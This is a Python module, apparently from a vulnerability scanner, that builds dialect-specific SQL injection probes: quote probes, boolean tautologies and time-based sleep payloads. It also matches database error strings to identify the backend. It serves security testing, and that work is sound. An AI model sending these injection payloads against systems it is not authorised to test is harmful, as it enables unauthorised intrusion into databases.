"""Dialect-aware SQLi hypotheses for modern HTTP/API request surfaces.

The engine deliberately separates SQL *meaning* from its wire representation.
It does not claim SQL injection from a payload string or a status change.  A
strategy supplies representations for a known semantic probe and the caller
must still establish a repeatable, target-specific differential (or a
provider-specific error that is absent from the control response).
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from typing import Iterable, Sequence


DIALECT_ALIASES = {
    "postgresql": "postgres",
    "pgsql": "postgres",
    "psql": "postgres",
    "supabase": "postgres",
    "cockroach": "postgres",
    "cockroachdb": "postgres",
    "mariadb": "mysql",
    "mssql": "mssql",
    "sqlserver": "mssql",
    "ms-sql": "mssql",
    "oracle": "oracle",
    "sqlite3": "sqlite",
    "h2": "h2",
}


def normalize_dialect(value: str | None) -> str:
    """Normalize framework/provider labels without guessing from a payload."""
    value = str(value or "generic").strip().lower().replace("_", "-")
    return DIALECT_ALIASES.get(value, value if value in {
        "mysql", "postgres", "mssql", "oracle", "sqlite", "h2", "generic"
    } else "generic")


@dataclass(frozen=True)
class SQLDialectStrategy:
    name: str
    error_markers: tuple[str, ...]
    supports_timing: bool

    def render(self, semantic: str, *, delay_sec: int = 4,
               input_context: str = "string") -> str:
        """Render one semantic probe for this dialect and input context."""
        semantic = str(semantic or "").lower()
        context = str(input_context or "string").lower()
        numeric = context in {"number", "numeric", "integer", "id"}
        if semantic == "quote_probe":
            return "'" if not numeric else "1'"
        if semantic == "boolean_true":
            if numeric:
                return "1 AND 1=1"
            return {
                "mysql": "' OR 1=1#",
                "postgres": "' OR 1=1--",
                "mssql": "' OR 1=1--",
                "oracle": "' OR 1=1--",
                "sqlite": "' OR 1=1--",
                "h2": "' OR 1=1--",
            }.get(self.name, "' OR 1=1-- ")
        if semantic == "boolean_false":
            if numeric:
                return "1 AND 1=2"
            return {
                "mysql": "' AND 1=2#",
                "postgres": "' AND 1=2--",
                "mssql": "' AND 1=2--",
                "oracle": "' AND 1=2--",
                "sqlite": "' AND 1=2--",
                "h2": "' AND 1=2--",
            }.get(self.name, "' AND 1=2-- ")
        if semantic == "time_true":
            delay_sec = max(1, min(8, int(delay_sec)))
            if numeric:
                prefix = "1 AND "
            else:
                prefix = "1' AND "
            if self.name == "mysql":
                return f"{prefix}IF(1=1,SLEEP({delay_sec}),0)-- -"
            if self.name == "postgres":
                return (
                    f"{prefix}(SELECT CASE WHEN 1=1 THEN pg_sleep({delay_sec}) "
                    "ELSE pg_sleep(0) END)--"
                )
            if self.name == "mssql":
                return f"1'; IF (1=1) WAITFOR DELAY '00:00:{delay_sec:02d}'--"
            if self.name == "oracle":
                return f"{prefix}1=DBMS_PIPE.RECEIVE_MESSAGE('AGY',{delay_sec})--"
            # SQLite and generic SQL have no portable sleep primitive.  Do not
            # pretend that a generic delay string is a proof strategy.
            return ""
        if semantic == "numeric_true":
            return "1 OR 1=1" if numeric else self.render("boolean_true", input_context=context)
        if semantic == "numeric_false":
            return "1 AND 1=2" if numeric else self.render("boolean_false", input_context=context)
        return ""


STRATEGIES = {
    "mysql": SQLDialectStrategy(
        "mysql",
        ("you have an error in your sql syntax", "mysql", "mysqli", "mariadb"),
        True,
    ),
    "postgres": SQLDialectStrategy(
        "postgres",
        ("pg_query", "postgresql", "psql:", "unterminated quoted string"),
        True,
    ),
    "mssql": SQLDialectStrategy(
        "mssql",
        ("system.data.sqlclient", "microsoft.data.sqlclient", "odbc sql server", "sqlserver"),
        True,
    ),
    "oracle": SQLDialectStrategy(
        "oracle",
        ("ora-", "oracle database", "dbms_sql", "ora-00933"),
        True,
    ),
    "sqlite": SQLDialectStrategy(
        "sqlite",
        ("sqlite error", "sqlite3", "near \"", "unrecognized token"),
        False,
    ),
    "h2": SQLDialectStrategy(
        "h2",
        ("org.h2", "h2 console", "jdbc:h2"),
        False,
    ),
    "generic": SQLDialectStrategy(
        "generic",
        ("sql syntax", "database error", "query failed"),
        False,
    ),
}


def strategy_for(dialect: str | None) -> SQLDialectStrategy:
    return STRATEGIES[normalize_dialect(dialect)]


def infer_dialect(texts: Iterable[str]) -> str:
    """Infer only from explicit provider/error markers; otherwise generic."""
    joined = "\n".join(str(item or "").lower() for item in texts)
    for name in ("postgres", "mssql", "oracle", "mysql", "sqlite", "h2"):
        if any(marker in joined for marker in STRATEGIES[name].error_markers):
            return name
    return "generic"


def candidate_dialects(explicit: str | None, evidence: Sequence[str] = ()) -> list[str]:
    """Return a short ranked list; never spray every dialect by default."""
    normalized = normalize_dialect(explicit)
    if normalized != "generic":
        return [normalized]
    inferred = infer_dialect(evidence)
    if inferred != "generic":
        return [inferred]
    # MySQL first preserves compatibility with the common lab fixture, then
    # PostgreSQL covers modern managed/API deployments.  Remaining dialects
    # require explicit metadata or a response marker.
    return ["mysql", "postgres"]


def render_sql_payload(semantic: str, dialect: str = "generic", *, delay_sec: int = 4,
                       input_context: str = "string") -> str:
    return strategy_for(dialect).render(semantic, delay_sec=delay_sec,
                                        input_context=input_context)


def error_marker(body: str, dialect: str | None = None) -> str | None:
    text = str(body or "").lower()
    names = [normalize_dialect(dialect)] if dialect and normalize_dialect(dialect) != "generic" else list(STRATEGIES)
    for name in names:
        for marker in STRATEGIES[name].error_markers:
            if marker.lower() in text:
                return marker
    return None


__all__ = [
    "DIALECT_ALIASES", "SQLDialectStrategy", "STRATEGIES", "candidate_dialects",
    "error_marker", "infer_dialect", "normalize_dialect", "render_sql_payload",
    "strategy_for",
]
